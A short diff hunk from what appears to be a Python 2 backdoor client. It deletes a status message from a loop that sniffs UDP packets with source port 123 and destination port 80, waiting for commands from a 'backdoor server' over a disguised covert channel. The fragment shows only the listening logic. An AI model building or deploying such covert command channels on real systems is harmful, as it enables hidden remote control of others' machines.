@@ -52,7 +52,6 @@ def main():
 	# 2. wait for command from backdoor server (sniffing)
 	while True:
 		if WAITING == 1:
-			print "Waiting for command ..."
 			sniff(filter="udp and dst port 80 and src port 123", prn=recv_packet, count=1)
 			WAITING = 0
 			continue
